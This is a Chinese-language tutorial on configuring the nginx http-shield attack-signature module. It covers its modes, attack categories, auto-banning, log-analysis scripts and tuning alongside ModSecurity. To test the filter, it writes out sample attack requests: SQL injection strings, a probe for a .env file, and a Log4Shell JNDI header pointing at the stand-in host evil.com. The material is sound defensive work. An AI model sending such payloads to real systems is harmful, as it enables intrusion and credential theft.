---
title: "http-shield 攻擊攔截"
desc: "編譯進去的攻擊特徵攔截，SQLi、Log4Shell、Shellshock 的低誤判防線"
aliases: [http-shield, shield, nginx-http-shield-module, SQLi, Log4Shell, Shellshock]
tags: [群組/軟體與開發工具, 服務/nginx, 服務/myguard, 主題/資安]
category: MyGuard與Angie
difficulty: 進階
status: 完成
distro: [ubuntu]
prerequisites: ["[[01-MyGuard套件庫介紹]]", "[[09-Nginx-安全設定]]"]
updated: 2026-08-28
---

# http-shield 攻擊攔截

> [!abstract] 這篇你會學到
> - **★★★★ shield 不是 WAF** —— 它和 ModSecurity 的定位差異
> - 完整的指令清單與 30 個攻擊分類
> - **★★★★ `detect` → `block` 的安全上線流程**
> - **★★★ 自動封鎖**（`shield_ban`）與狀態端點
> - JSON 命中日誌的分析
> - **★★★ 誤判的處理**（`shield_skip`）
> - 和 ModSecurity 的搭配

> [!warning] 未實機驗證 ★★★
> ```
> ★★★ 本章依據 https://github.com/myguard-labs/nginx-http-shield-module
>      2026 年 8 月的文件撰寫。
>
> ★★★★ 實作前請對照官方 README 確認指令與分類清單。
> ★★ 特徵庫與分類會隨版本更新。
> ```

## 前置知識

- [[01-MyGuard套件庫介紹]] — 套件庫與模組安裝
- [[09-Nginx-安全設定]] — NGINX 的安全設定基礎
- [[01-WAF概念與ModSecurity安裝]] — **★★★ 完整 WAF 的做法**（★ 用來對照）

---

## ★★★★ shield 不是 WAF

```
★★★★ 這是理解 shield 的關鍵：

  ┌──────────────────┬────────────────────────┬─────────────────────────┐
  │                  │ ★★★ ModSecurity + CRS  │ ★★★★ http-shield        │
  ├──────────────────┼────────────────────────┼─────────────────────────┤
  │ 定位             │ 完整的 WAF             │ ★★★ 已知漏洞的「地板」  │
  │ 規則             │ ★★ 規則語言 + 正規表示式│ ★★★★ 編譯進去的固定特徵 │
  │ 可自訂           │ ★★★ 完全可以           │ ✗ 只能停用分類          │
  │ ★★★★ 效能        │ ★★ 每個請求跑數百條規則 │ ★★★★ 單次 Aho-Corasick  │
  │                  │ → 明顯的 CPU 開銷      │ → ★★★ 約 1µs / URI      │
  │ ★★★★ 誤判率      │ ★★★ 高（要長期調校）   │ ★★★★ 接近零             │
  │ 涵蓋範圍         │ ★★★ 廣（含未知攻擊模式）│ ★★ 窄（已知的漏洞利用） │
  │ 學習曲線         │ ★★★ 陡               │ ★ 平緩                  │
  │ 記憶體           │ ★★ 高                 │ ★★★ 低                  │
  └──────────────────┴────────────────────────┴─────────────────────────┘

★★★★ 官方的定位：「a near-zero-FP legacy-exploit floor」
  → 「誤判率接近零的、針對舊漏洞利用的防護地板」

★★★ 意思是：
  · ★★★★ 它【不取代 WAF】
  · 它擋的是【已知的、明確的漏洞利用】
    （SQLi 的特定 payload、Log4Shell 的 JNDI 字串、Shellshock 的 bash 函式）
  · ★★★ 因為特徵明確，所以誤判極低
  · ★★★★ 因為用 Aho-Corasick 單次掃描，所以幾乎沒有效能開銷

★★★★ 實務上的組合：
  ① ★★★ 只用 shield → 擋掉 90% 的自動化掃描與已知漏洞利用，成本極低
  ② ★★★★ shield + ModSecurity → 前者當快速的第一道，後者做深度檢測
  ③ ★★ 只用 ModSecurity → 涵蓋廣但要花很多時間調校
```

---

## 安裝

```bash
$ sudo apt install -y libnginx-mod-http-shield
#   ★★★ 套件名稱可能不同
$ apt-cache search shield

$ ls -l /usr/lib/nginx/modules/ | grep -i shield
$ cat /etc/nginx/modules-enabled/*shield*
load_module modules/ngx_http_shield_module.so;

$ sudo nginx -t
```

---

## ★★★ 指令清單

| 指令 | 語境 | 預設 | 說明 |
| --- | --- | --- | --- |
| **`shield off\|detect\|block`** | http, server, location | `off` | **★★★★ 運作模式**（見下） |
| **`shield_body on\|off`** | http, server, location | `on` | **★★★ 是否檢查請求本體** |
| **`shield_max_body <size>`** | http, server, location | `8k` | **★★★ 掃描本體的位元組數** |
| **`shield_status <code>`** | http, server, location | `403` | **★★ 攔截時的回應碼**（`403`/`404`/`419`/`429`/`444`） |
| **`shield_skip <categories>`** | http, server, location | — | **★★★★ 停用的分類**（空白分隔） |
| **`shield_log <dest>`** | http, server, location | — | **★★★ 命中記錄的檔案或 syslog** |
| **`shield_ban_zone <name>:<size>`** | http | — | **★★★ 累犯封鎖的共享記憶體區** |
| **`shield_ban zone=<z> count=<n> window=<t> bantime=<t>`** | http, server, location | — | **★★★★ 自動封鎖規則** |
| **`shield_ban_status <zone>`** | location | — | **★★ 封鎖狀態的 JSON 端點** |

### ★★★★ 三種模式

```
★★★★ shield 的三個模式決定了上線的節奏：

  off      ★ 完全不檢查（預設）

  ★★★★ detect
    → 【只記錄，不阻擋】
    → ★★★ 請求正常放行，命中的記錄寫進 shield_log
    → ★★★★ 【上線前一定要先跑這個模式至少一週】

  ★★★ block
    → 命中就回 shield_status 指定的狀態碼
    → ★★ 檢查失敗時（記憶體不足等）回 500（fail-safe）

★★★★ detect 模式的 fail-open：
    → 檢查失敗時【記錄並放行】
    → ★★★ 所以 detect 模式完全不會影響服務
```

---

## ★★★ 30 個攻擊分類

```
★★★ 官方提供 30 個分類、656 個特徵，分成兩類：

┌─────────────────────────────────────────────────────────────┐
│ ★★ 只檢查【請求列與標頭】的（10 個）                          │
├─────────────────────────────────────────────────────────────┤
│ cmdi           ★★★ 命令注入                                  │
│ xss            跨站腳本                                       │
│ template       模板注入                                       │
│ lfi            ★★★ 本地檔案包含                              │
│ php_rce        ★★★ PHP 遠端執行                              │
│ java_rce       Java 遠端執行                                  │
│ java_eval      Java eval                                      │
│ sensitive_file ★★★★ 憑證/設定檔路徑（.env / .git 等）        │
│ exploit_path   ★★★ 已知 CVE 的端點                           │
│ traversal      ★★★ 路徑穿越                                  │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ ★★★ 會檢查【請求本體】的（20 個）                             │
├─────────────────────────────────────────────────────────────┤
│ sqli           ★★★★ SQL 注入（含各種規避手法）               │
│ deserial       ★★★ Java/其他語言的反序列化 gadget            │
│ shellshock     ★★★ bash 函式漏洞（CVE-2014-6271）            │
│ log4shell      ★★★★ JNDI 注入（CVE-2021-44228）              │
│ rails_yaml     Rails 的 YAML 反序列化                         │
│ nosql          NoSQL 注入                                     │
│ ssti           伺服器端模板注入                               │
│ webshell       ★★★ 常見的 webshell 檔名                      │
│ ssrf_meta      ★★★★ 雲端 metadata / loopback 端點            │
│ crlf           ★★ CRLF 注入                                   │
│ nullbyte       null byte 規避                                 │
│ overlong       ★★ overlong UTF-8 編碼規避                     │
│ drupal         Drupalgeddon 等                                │
│ vbulletin      vBulletin 的已知漏洞                           │
│ xmlrpc         ★★ WordPress xmlrpc.php 濫用                   │
│ ssi            SSI 注入                                       │
│ imagetragick   ★★ ImageMagick 的 CVE-2016-3714               │
│ httpoxy        ★★ CGI 的 HTTP_PROXY 汙染                      │
│ range_dos      ★★ Range 標頭的 DoS                            │
│ ctrl_char      控制字元                                       │
│ dotfile        ★★★ 隱藏檔存取                                │
└─────────────────────────────────────────────────────────────┘

★★★ 檢查的位置：
  請求列、查詢字串、User-Agent、Referer、Content-Type、
  ★★ 請求本體、Cookie 值、含 URI 的標頭
```

> [!tip] 引擎的效能特性 ★★★
> ```
> ★★★★ shield 用【單次 Aho-Corasick 掃描】：
>   → 把 656 個特徵編譯成【一個有限狀態機】
>   → 掃描一次緩衝區就同時比對所有特徵
>   → ★★★★ 複雜度是 O(位元組數)，和特徵數量【無關】
>   → 典型的 URI 約 1 微秒
>
> ★★★ 對照 ModSecurity：
>   → 每條規則跑一次正規表示式
>   → CRS 有數百條規則 → ★★★ 每個請求跑數百次 regex
>   → ★★ CPU 開銷明顯（★ 高流量時特別有感）
>
> ★★★★ 這就是為什麼 shield 可以「幾乎免費」地開著
> ```

---

## ★★★★ 安全的上線流程

```
★★★★ 絕對不要一開始就用 block 模式！

  ┌────────────────────────────────────────────────────────┐
  │ ★★★★ 第 1 週：detect 模式                              │
  │   shield detect;                                        │
  │   → 記錄所有命中，【不影響任何請求】                     │
  │   → ★★★ 分析日誌，找出誤判                              │
  └───────────────────────┬────────────────────────────────┘
                          ▼
  ┌────────────────────────────────────────────────────────┐
  │ ★★★ 第 2 週：處理誤判                                   │
  │   → 用 shield_skip 停用會誤判的分類                     │
  │   → ★★ 或在特定 location 停用                           │
  └───────────────────────┬────────────────────────────────┘
                          ▼
  ┌────────────────────────────────────────────────────────┐
  │ ★★★ 第 3 週：block 模式（★ 先在低流量時段）             │
  │   shield block;                                         │
  │   → ★★★★ 密切監控 4xx 的比率                            │
  └───────────────────────┬────────────────────────────────┘
                          ▼
  ┌────────────────────────────────────────────────────────┐
  │ ★★ 第 4 週：加上自動封鎖                                │
  │   shield_ban zone=shield count=5 window=1m bantime=1h;  │
  └────────────────────────────────────────────────────────┘
```

### 第一階段：detect

```nginx
# /etc/nginx/nginx.conf
load_module modules/ngx_http_shield_module.so;

http {
    # ═══ ★★★★ 全域用 detect（★ 只記錄不阻擋）═══
    shield detect;
    shield_body on;
    shield_max_body 8k;
    shield_log /var/log/nginx/shield.json;

    # ★★★ 封鎖用的共享記憶體區（★ 先定義，之後才用得到）
    shield_ban_zone shield:10m;

    server {
        listen 443 ssl;
        server_name app.example.gov.tw;

        location / {
            root /var/www/app/current/public;
            try_files $uri $uri/ /index.php?$query_string;
        }

        # ═══ ★★ 狀態端點（★ 一定要限制存取）═══
        location = /shield-status {
            shield_ban_status shield;
            allow 127.0.0.1;
            allow 10.10.20.0/24;
            deny all;
            access_log off;
        }
    }
}
```

```bash
$ sudo nginx -t && sudo systemctl reload nginx

# ★★★ 產生一些測試流量
$ curl -s "https://app.example.gov.tw/?id=1'+union+select+password+from+users--" -o /dev/null
$ curl -s "https://app.example.gov.tw/.env" -o /dev/null
$ curl -s -H 'User-Agent: ${jndi:ldap://evil.com/x}' https://app.example.gov.tw/ -o /dev/null

# ★★★★ 看命中記錄
$ sudo tail -5 /var/log/nginx/shield.json | jq .
{
  "ts": "2026-08-28T19:05:11+08:00",
  "ip": "203.0.113.7",
  "cat": "sqli",
  "src": "uri",
  "mode": "detect",
  "status": 200,
  "req": "GET /?id=1' union select password from users-- HTTP/1.1"
}
{
  "ts": "2026-08-28T19:05:12+08:00",
  "cat": "sensitive_file",
  "src": "uri",
  "mode": "detect",
  "req": "GET /.env HTTP/1.1"
}
{
  "ts": "2026-08-28T19:05:13+08:00",
  "cat": "log4shell",
  "src": "header",
  "mode": "detect",
  "req": "GET / HTTP/1.1"
}
#   ★★★ mode 是 detect → status 200 → 請求正常放行
```

### ★★★★ 分析日誌找出誤判

```bash
#!/usr/bin/env bash
# ★★★★ /usr/local/bin/shield-analyze —— 分析 shield 的命中記錄
set -uo pipefail
LOG="${1:-/var/log/nginx/shield.json}"
DAYS="${2:-7}"

command -v jq >/dev/null || { echo "★★ 需要 jq"; exit 1; }
[ -f "$LOG" ] || { echo "★★ 找不到 $LOG"; exit 1; }

SINCE=$(date -d "-$DAYS days" +%Y-%m-%d)
echo "═══ shield 分析（近 $DAYS 天，自 $SINCE）═══"

FILTER=".ts >= \"$SINCE\""
TOTAL=$(jq -c "select($FILTER)" "$LOG" 2>/dev/null | wc -l)
echo "  總命中數: $TOTAL"
[ "$TOTAL" -eq 0 ] && { echo "  ★ 沒有命中"; exit 0; }

# ═══ ★★★【1】依分類 ═══
echo -e "\n【1】★★★ 依分類"
jq -r "select($FILTER) | .cat" "$LOG" 2>/dev/null | sort | uniq -c | sort -rn | \
  awk -v t="$TOTAL" '{printf "  %-18s %6d  (%.1f%%)\n", $2, $1, $1/t*100}'

# ═══ ★★★【2】依來源 IP ═══
echo -e "\n【2】★★★ Top 10 來源 IP"
jq -r "select($FILTER) | .ip" "$LOG" 2>/dev/null | sort | uniq -c | sort -rn | head -10 | \
  awk '{printf "  %-18s %6d\n", $2, $1}'

# ═══ ★★★★【3】疑似誤判（★ 這一段最重要）═══
echo -e "\n【3】★★★★ 疑似誤判"
echo "  ── 單一 IP 只命中 1~2 次（★ 可能是正常使用者）──"
jq -r "select($FILTER) | .ip" "$LOG" 2>/dev/null | sort | uniq -c | \
  awk '$1 <= 2 {print $2}' | head -10 | sed 's/^/    /'

FP_IPS=$(jq -r "select($FILTER) | .ip" "$LOG" 2>/dev/null | sort | uniq -c | \
         awk '$1 <= 2 {print $2}' | wc -l)
echo "    共 $FP_IPS 個 IP 只命中 1~2 次"
[ "$FP_IPS" -gt 20 ] && echo "    ★★★★ 數量偏多，要仔細檢查是不是誤判"

echo "  ── 這些低頻 IP 命中的請求 ──"
jq -r "select($FILTER) | \"\\(.ip)\\t\\(.cat)\\t\\(.req)\"" "$LOG" 2>/dev/null | \
  awk -F'\t' 'NR==FNR{c[$1]++;next} c[$1]<=2 {print}' \
    <(jq -r "select($FILTER) | .ip" "$LOG" 2>/dev/null) - 2>/dev/null | \
  head -10 | cut -c1-140 | sed 's/^/    /'

# ═══ ★★★【4】依 location ═══
echo -e "\n【4】命中的路徑"
jq -r "select($FILTER) | .req" "$LOG" 2>/dev/null | \
  awk '{print $2}' | sed 's/?.*//' | sort | uniq -c | sort -rn | head -10 | \
  awk '{printf "  %6d  %s\n", $1, $2}'

# ═══ ★★★【5】檢查來源欄位 ═══
echo -e "\n【5】命中的位置"
jq -r "select($FILTER) | .src" "$LOG" 2>/dev/null | sort | uniq -c | sort -rn | \
  awk '{printf "  %-12s %6d\n", $2, $1}'

# ═══ ★★★★【6】建議 ═══
echo -e "\n【6】★★★★ 上線建議"
for cat in $(jq -r "select($FILTER) | .cat" "$LOG" 2>/dev/null | sort -u); do
    n=$(jq -r "select($FILTER and .cat==\"$cat\") | .ip" "$LOG" 2>/dev/null | sort -u | wc -l)
    hits=$(jq -c "select($FILTER and .cat==\"$cat\")" "$LOG" 2>/dev/null | wc -l)
    ratio=$(awk -v h="$hits" -v n="$n" 'BEGIN{printf "%.1f", (n>0? h/n : 0)}')
    printf "  %-18s %5d 次 / %4d 個 IP (平均 %s 次/IP)  " "$cat" "$hits" "$n" "$ratio"
    #   ★★★ 平均次數低 = 分散在很多正常使用者身上 = 可能誤判
    awk -v r="$ratio" 'BEGIN{ if (r < 2) print "★★★★ 疑似誤判"; else print "✓ 像是攻擊" }'
done

echo -e "\n★★★ 誤判的處理："
echo "  shield_skip <分類名>;              # 全域停用該分類"
echo "  location /xxx { shield_skip sqli; } # 只在特定路徑停用"
```

```bash
$ sudo install -m755 shield-analyze.sh /usr/local/bin/shield-analyze
$ sudo shield-analyze /var/log/nginx/shield.json 7

═══ shield 分析（近 7 天，自 2026-08-21）═══
  總命中數: 4820

【1】★★★ 依分類
  sensitive_file       2840  (58.9%)
  sqli                  892  (18.5%)
  exploit_path          620  (12.9%)
  log4shell             284  (5.9%)
  traversal             142  (2.9%)
  xss                    42  (0.9%)

【2】★★★ Top 10 來源 IP
  203.0.113.45         3240
  198.51.100.22         892

【3】★★★★ 疑似誤判
    共 4 個 IP 只命中 1~2 次

【6】★★★★ 上線建議
  sensitive_file      2840 次 /    8 個 IP (平均 355.0 次/IP)  ✓ 像是攻擊
  sqli                 892 次 /   12 個 IP (平均 74.3 次/IP)   ✓ 像是攻擊
  xss                   42 次 /   38 個 IP (平均 1.1 次/IP)    ★★★★ 疑似誤判
```

### ★★★ 處理誤判

```nginx
# ═══ ★★★ 方法一：全域停用該分類 ═══
http {
    shield block;
    shield_skip xss;                    # ★★★ 停用 xss 分類
    shield_skip xss template ssti;      # ★★ 多個
}

# ═══ ★★★★ 方法二：只在特定路徑停用（★ 更精準）═══
server {
    location / {
        shield block;
    }

    # ★★★ 舊系統的相容性路徑
    location /legacy-app/ {
        shield block;
        shield_skip sqli xss;           # ★★★ 只在這裡放寬
        proxy_pass http://legacy-backend;
    }

    # ★★★ 富文本編輯器的上傳（★ 內容本來就會像 XSS）
    location /api/content/ {
        shield block;
        shield_skip xss template;
        shield_body off;                # ★★ 或乾脆不檢查本體
    }

    # ★★★★ 管理後台完全停用（★ 已經有認證）
    location /admin/ {
        shield off;
        auth_basic "Admin";
        auth_basic_user_file /etc/nginx/.htpasswd;
        allow 10.10.20.0/24;
        deny all;
    }
}
```

> [!danger] 誤判處理的原則 ★★★
> ```
> ★★★★ 優先順序（★ 從最精準到最寬鬆）：
>
>   ① ★★★★ 【修正應用程式】
>      → 誤判常常是因為應用程式的參數設計不好
>        （★ 把 SQL 片段當成 URL 參數傳）
>      → ★★★ 這才是根本解法
>
>   ② ★★★ 【在特定 location 停用特定分類】
>      location /legacy/ { shield_skip sqli; }
>      → ★★ 影響範圍最小
>
>   ③ ★★ 【在特定 location 關掉本體檢查】
>      shield_body off;
>
>   ④ ★ 【全域停用該分類】
>      shield_skip xss;
>      → ★★★ 影響範圍最大，最後才用
>
> ★★★★ 絕對不要：
>   遇到誤判就 shield off;     ← ★★★★ 等於白裝了
> ```

---

## ★★★ 自動封鎖

```nginx
http {
    # ★★★ 共享記憶體區（★ 記錄每個 IP 的命中次數）
    shield_ban_zone shield:10m;

    shield block;
    shield_log /var/log/nginx/shield.json;

    server {
        listen 443 ssl;
        server_name app.example.gov.tw;

        location / {
            shield block;

            # ═══ ★★★★ 自動封鎖 ═══
            shield_ban zone=shield count=5 window=1m bantime=1h;
            #   ★★★ 1 分鐘內命中 5 次 → 封鎖 1 小時

            root /var/www/app/current/public;
            try_files $uri $uri/ /index.php?$query_string;
        }

        # ★★ 狀態端點
        location = /shield-status {
            shield_ban_status shield;
            allow 127.0.0.1;
            deny all;
            access_log off;
        }
    }
}
```

```bash
# ★★★ 查詢封鎖狀態
$ curl -s http://127.0.0.1/shield-status | jq .
{
  "zone": "shield",
  "banned": 12,
  "tracked": 284,
  "memory": { "used": 48210, "total": 10485760 }
}

# ★★★ 監控封鎖數量
$ watch -n 10 'curl -s http://127.0.0.1/shield-status | jq -r "\"封鎖: \(.banned)  追蹤: \(.tracked)\""'
```

```
★★★ 參數的選擇：

  count   ★★★ 觸發封鎖的命中次數
          → 太小（1~2）→ ★★★★ 誤判時直接封鎖正常使用者
          → 太大（50+）→ ★★ 攻擊者可以打很久
          → ★★★ 建議 5~10

  window  ★★ 計數的時間窗
          → ★★★ 1m 適合擋自動化掃描
          → 10m 適合擋比較慢的探測

  bantime ★★★ 封鎖時長
          → ★★★ 第一次 1h 就好
          → ★★★★ 太長的話誤判的影響很大
          → ★★ 累犯的處理交給 fail2ban（可以遞增）

★★★★ 保守的起手式：
  shield_ban zone=shield count=10 window=1m bantime=10m;
  → 觀察一週後再調緊
```

> [!warning] 封鎖的三個風險 ★★★
> ```
> ① ★★★★ 【NAT 後面的多個使用者共用一個 IP】
>    → 一個人觸發 → ★★★ 整個公司/學校被封鎖
>    → ★★ 對機關的對外服務特別要注意
>    → ★★★ 解法：count 設高一點；重要客戶的 IP 加白名單
>
> ② ★★★ 【CDN / 反向代理後面看到的是 CDN 的 IP】
>    → ★★★★ 封鎖 CDN 的 IP = 封鎖所有使用者！
>    → ★★★ 一定要正確設定 real_ip_header
>
> ③ ★★ 【封鎖狀態存在共享記憶體】
>    → reload 或重啟後【封鎖清單消失】
>    → ★★ 這其實是好事（★ 誤判的影響有限）
>    → 要持久化的話用 fail2ban
> ```

```nginx
# ★★★★ CDN 後面的正確設定
http {
    # ★★★ 先設定真實 IP，shield 才會看到正確的來源
    set_real_ip_from 10.10.20.0/24;          # ★ 內部的負載平衡器
    set_real_ip_from 173.245.48.0/20;        # ★ Cloudflare 的網段
    # ... 其他 CDN 網段
    real_ip_header CF-Connecting-IP;         # ★★★ 或 X-Forwarded-For
    real_ip_recursive on;

    shield_ban_zone shield:10m;
    shield block;
    shield_ban zone=shield count=10 window=1m bantime=1h;
}
```

```bash
# ★★★★ 驗證 shield 看到的是真實 IP
$ sudo tail -3 /var/log/nginx/shield.json | jq -r '.ip'
203.0.113.45                              # ★★★ 真實的客戶端 IP
10.10.20.1                                # ★★★★ 錯！這是負載平衡器的 IP
```

---

## 完整實戰範例

```nginx
# /etc/nginx/nginx.conf
load_module modules/ngx_http_shield_module.so;

http {
    # ═══ ★★★ 真實 IP（★ 在 CDN/LB 後面時必要）═══
    set_real_ip_from 10.10.20.0/24;
    real_ip_header X-Forwarded-For;
    real_ip_recursive on;

    # ═══ ★★★ shield 全域設定 ═══
    shield detect;                          # ★★★★ 預設 detect，特定 location 才 block
    shield_body on;
    shield_max_body 8k;
    shield_status 403;
    shield_log /var/log/nginx/shield.json;
    shield_ban_zone shield:10m;

    # ═══ 日誌格式（★ 對照分析用）═══
    log_format timed '$remote_addr - $remote_user [$time_local] '
                     '"$request" $status $body_bytes_sent '
                     '"$http_referer" "$http_user_agent" '
                     'rt=$request_time urt=$upstream_response_time';

    server {
        listen 443 ssl;
        http2 on;
        server_name app.example.gov.tw;
        access_log /var/log/nginx/app-access.log timed;

        root /var/www/app/current/public;
        index index.php;

        # ═══ ★★★★ 一般流量：block + 自動封鎖 ═══
        location / {
            shield block;
            shield_ban zone=shield count=10 window=1m bantime=1h;
            try_files $uri $uri/ /index.php?$query_string;
        }

        # ═══ ★★★ API：更嚴格 ═══
        location /api/ {
            shield block;
            shield_max_body 16k;            # ★★ API 的 body 可能較大
            shield_ban zone=shield count=5 window=1m bantime=2h;
            try_files $uri /index.php?$query_string;
        }

        # ═══ ★★★ 富文本上傳：放寬 xss ═══
        location /api/content/ {
            shield block;
            shield_skip xss template ssti;   # ★★★ 編輯器內容會誤判
            shield_max_body 64k;
            try_files $uri /index.php?$query_string;
        }

        # ═══ ★★★ 檔案上傳：不檢查本體 ═══
        location /api/upload {
            shield block;
            shield_body off;                 # ★★★★ 二進位內容不用掃
            client_max_body_size 20m;
            try_files $uri /index.php?$query_string;
        }

        # ═══ ★★★ 管理後台：已有認證，不檢查 ═══
        location /admin/ {
            shield off;
            allow 10.10.20.0/24;
            deny all;
            try_files $uri /index.php?$query_string;
        }

        # ═══ ★★★ 靜態資源：不用檢查（★ 省 CPU）═══
        location ~* \.(?:css|js|jpg|jpeg|png|gif|ico|svg|woff2?|ttf)$ {
            shield off;
            expires 1y;
            add_header Cache-Control "public, immutable";
            access_log off;
        }

        # ═══ ★★★★ PHP ═══
        location ~ \.php$ {
            shield block;
            shield_ban zone=shield count=5 window=1m bantime=2h;
            try_files $uri =404;             # ★★★★ 防 PathInfo RCE
            fastcgi_pass unix:/run/php/php8.3-fpm.sock;
            fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
            include fastcgi_params;
        }

        # ═══ ★★ 狀態端點 ═══
        location = /shield-status {
            shield_ban_status shield;
            allow 127.0.0.1;
            allow 10.10.20.50;              # ★ 監控伺服器
            deny all;
            access_log off;
        }

        # ═══ ★★★ 隱藏檔 ═══
        location ~ /\. {
            deny all;
            return 404;
        }
    }
}
```

```bash
# ═══ ★★★★ 上線後的監控 ═══
$ sudo tee /usr/local/bin/shield-monitor >/dev/null <<'EOF'
#!/usr/bin/env bash
# ★★★ shield 的日常監控
LOG=/var/log/nginx/shield.json
ACCESS=/var/log/nginx/app-access.log
STATUS_URL=http://127.0.0.1/shield-status

echo "═══ shield 監控 $(date '+%F %T') ═══"

# ★★★ 今日命中
TODAY=$(date +%Y-%m-%d)
N=$(jq -c "select(.ts >= \"$TODAY\")" "$LOG" 2>/dev/null | wc -l)
BLOCKED=$(jq -c "select(.ts >= \"$TODAY\" and .mode==\"block\")" "$LOG" 2>/dev/null | wc -l)
echo "  今日命中: $N（阻擋 $BLOCKED）"

# ★★★★ 4xx 比率的變化（★ 誤判的早期訊號）
echo "  ── 狀態碼分布（今日）──"
TOTAL=$(grep -c "$(date '+%d/%b/%Y')" "$ACCESS" 2>/dev/null || echo 1)
for code in 200 403 404; do
    c=$(awk -v d="$(date '+%d/%b/%Y')" -v s=" $code " '$0 ~ d && index($0, s)' "$ACCESS" 2>/dev/null | wc -l)
    awk -v c="$c" -v t="$TOTAL" -v code="$code" \
      'BEGIN{printf "    %-5s %7d  (%.2f%%)", code, c, c/t*100
             if (code==403 && c/t > 0.05) printf "  ★★★★ 403 比率偏高，檢查誤判"
             print ""}'
done

# ★★★ 封鎖狀態
echo "  ── 封鎖 ──"
curl -sf "$STATUS_URL" 2>/dev/null | \
  jq -r '"    封鎖中: \(.banned)  追蹤中: \(.tracked)"' || echo "    （狀態端點不可用）"

# ★★★★ 分類分布
echo "  ── 今日 Top 5 分類 ──"
jq -r "select(.ts >= \"$TODAY\") | .cat" "$LOG" 2>/dev/null | \
  sort | uniq -c | sort -rn | head -5 | awk '{printf "    %-18s %6d\n", $2, $1}'

# ★★★★ 疑似誤判（★ 每個 IP 只命中一次的比例）
SINGLE=$(jq -r "select(.ts >= \"$TODAY\") | .ip" "$LOG" 2>/dev/null | \
         sort | uniq -c | awk '$1 == 1' | wc -l)
UNIQ=$(jq -r "select(.ts >= \"$TODAY\") | .ip" "$LOG" 2>/dev/null | sort -u | wc -l)
[ "$UNIQ" -gt 0 ] && awk -v s="$SINGLE" -v u="$UNIQ" \
  'BEGIN{printf "  ── 單次命中的 IP: %d/%d (%.1f%%)  ", s, u, s/u*100
         if (s/u > 0.5) print "★★★★ 比例偏高，可能有誤判"; else print "✓"}'
EOF
$ sudo chmod +x /usr/local/bin/shield-monitor
$ sudo shield-monitor

$ sudo tee /etc/cron.d/shield-monitor >/dev/null <<'EOF'
0 9 * * * root /usr/local/bin/shield-monitor 2>&1 | logger -t shield
EOF
```

---

## ★★★ 和 ModSecurity 搭配

```
★★★★ 兩者是【互補】不是【互斥】：

  ┌──────────────────────────────────────────────────────┐
  │ 請求進來                                              │
  │    │                                                  │
  │    ▼                                                  │
  │ ★★★★ shield（快速的第一道）                           │
  │    · 單次 Aho-Corasick，約 1µs                        │
  │    · ★★★ 擋掉自動化掃描與已知漏洞利用                 │
  │    · 誤判極低 → 可以放心 block                        │
  │    │                                                  │
  │    ▼ 通過                                             │
  │ ★★★ ModSecurity + CRS（深度檢測）                     │
  │    · 數百條規則、正規表示式                            │
  │    · ★★ 涵蓋未知的攻擊模式                            │
  │    · ★★★ 需要長期調校                                 │
  │    │                                                  │
  │    ▼ 通過                                             │
  │ 應用程式                                              │
  └──────────────────────────────────────────────────────┘

★★★ 搭配的好處：
  ① ★★★★ shield 先擋掉大量的自動化掃描
     → ★★★ ModSecurity 的負擔大幅降低（★ CPU 省很多）
  ② ★★ 兩層防護，涵蓋範圍互補
  ③ ★★★ shield 的低誤判可以放心 block，
     ModSecurity 可以先用 DetectionOnly 慢慢調
```

```nginx
http {
    # ═══ ★★★★ 第一道：shield ═══
    shield block;
    shield_log /var/log/nginx/shield.json;
    shield_ban_zone shield:10m;

    # ═══ ★★★ 第二道：ModSecurity ═══
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;

    server {
        listen 443 ssl;
        server_name app.example.gov.tw;

        location / {
            shield block;
            shield_ban zone=shield count=10 window=1m bantime=1h;
            # ★★ ModSecurity 繼承 http 層的設定
            try_files $uri /index.php?$query_string;
        }

        # ★★★ 靜態資源兩個都關（★ 省 CPU）
        location ~* \.(?:css|js|jpg|png|woff2)$ {
            shield off;
            modsecurity off;
            expires 1y;
        }
    }
}
```

```bash
# ★★★★ 比較兩者的攔截效果
$ echo "── shield 攔截 ──"
$ jq -r 'select(.mode=="block") | .cat' /var/log/nginx/shield.json | \
    sort | uniq -c | sort -rn | head -5

$ echo "── ModSecurity 攔截 ──"
$ sudo grep -oP '\[id "\K[0-9]+' /var/log/modsec_audit.log 2>/dev/null | \
    sort | uniq -c | sort -rn | head -5

# ★★★ CPU 開銷比較
$ sudo perf stat -p "$(pgrep -o -f 'nginx: worker')" sleep 10 2>&1 | \
    grep -E 'task-clock|cycles'
```

---

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| **`unknown directive "shield"`** ★★★★ | 模組沒載入 | `load_module` 放最上層；`nginx -T \| grep shield` |
| **正常使用者被擋（403）** ★★★★ | **誤判** | **回到 `detect` 分析**；`shield_skip <分類>` |
| **403 比率突然升高** ★★★★ | 剛開 block 或有誤判 | `shield-analyze`；看命中的分類與 IP 分布 |
| **封鎖了整個公司** ★★★★ | **NAT 共用 IP** | `count` 調高；白名單；看真實 IP |
| **封鎖了 CDN 的 IP** ★★★★ | **`real_ip_header` 沒設** | `set_real_ip_from` + `real_ip_header` |
| **狀態端點 404** ★★★ | 沒設 `shield_ban_status` | `location = /shield-status { shield_ban_status shield; }` |
| **本體攻擊沒擋到** ★★★ | `shield_max_body` 太小 | 調大；但注意 CPU |
| **上傳檔案很慢** ★★★ | 在掃描二進位本體 | 上傳的 location 設 `shield_body off` |
| **日誌檔太大** ★★ | 命中太多 | logrotate；或縮小記錄範圍 |
| **reload 後封鎖清單消失** ★★ | **共享記憶體重置** | 正常行為；要持久化用 fail2ban |
| **和 ModSecurity 衝突** ★★ | 兩者都擋 | 分工：shield 在前，ModSec 在後 |

### 排查

```bash
# 【1】★★★ 模組與設定
$ sudo nginx -T 2>/dev/null | grep -E 'load_module.*shield|^\s*shield'
$ ls -l /usr/lib/nginx/modules/ | grep -i shield
$ sudo nginx -t

# 【2】★★★★ 命中記錄
$ sudo tail -20 /var/log/nginx/shield.json | jq .
$ sudo jq -r '.cat' /var/log/nginx/shield.json | sort | uniq -c | sort -rn

# 【3】★★★★ 特定 IP 為什麼被擋
$ IP=203.0.113.45
$ sudo jq -c "select(.ip==\"$IP\")" /var/log/nginx/shield.json | tail -10
$ sudo grep "^$IP " /var/log/nginx/app-access.log | tail -10

# 【4】★★★★ 測試特定 payload
$ curl -sI "https://app.example.gov.tw/?q=1'+or+1=1--"
HTTP/2 403                                # ★★★ 被擋
$ sudo tail -1 /var/log/nginx/shield.json | jq -r '.cat'
sqli

